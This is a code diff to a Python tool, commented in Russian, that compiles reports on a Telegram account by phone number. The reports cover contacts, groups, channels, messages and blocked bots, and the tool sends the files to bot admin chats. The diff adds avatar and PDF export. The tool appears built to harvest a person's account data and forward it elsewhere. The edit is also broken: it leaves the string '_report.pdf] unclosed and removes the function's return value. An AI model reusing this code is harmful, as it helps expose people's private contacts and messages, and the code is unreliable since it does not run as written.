@@ -15,8 +15,11 @@ from datetime import datetime
 from typing import Optional
 import re
 from jinja2 import Template
+from weasyprint import HTML
 
 def generate_html_report(phone, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html):
+    # Путь к аватарке пользователя
+    avatar_path = f"{phone}.jpg"
 
     # Открываем HTML шаблон
     with open('template.html', 'r', encoding='utf-8') as file:
@@ -47,7 +50,8 @@ def generate_html_report(phone, userid, userinfo, firstname, lastname, username,
         private_channels_html=private_channels_html,
         public_groups_html=public_groups_html,
         private_groups_html=private_groups_html,
-        deleted_groups_html=deleted_groups_html
+        deleted_groups_html=deleted_groups_html,
+        avatar_user=avatar_path
     )
 
     # Сохраняем результат в HTML файл
@@ -55,7 +59,9 @@ def generate_html_report(phone, userid, userinfo, firstname, lastname, username,
     with open(report_filename, 'w', encoding='utf-8') as file:
         file.write(html_content)
 
-    return report_filename
+    # Преобразуем HTML в PDF
+    pdf_filename = f"{phone}_report.pdf"
+    HTML(string=html_content).write_pdf(pdf_filename)
 
 
     
@@ -741,7 +747,7 @@ def get_participants_and_save_xlsx(client, index: int, id: bool, name: bool, gro
     
 # Функци по отправке в боты
 def send_files_to_bot(bot, admin_chat_ids):
-    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html']
+    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_report.pdf]
 
     for file_extension in file_extensions:
         files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
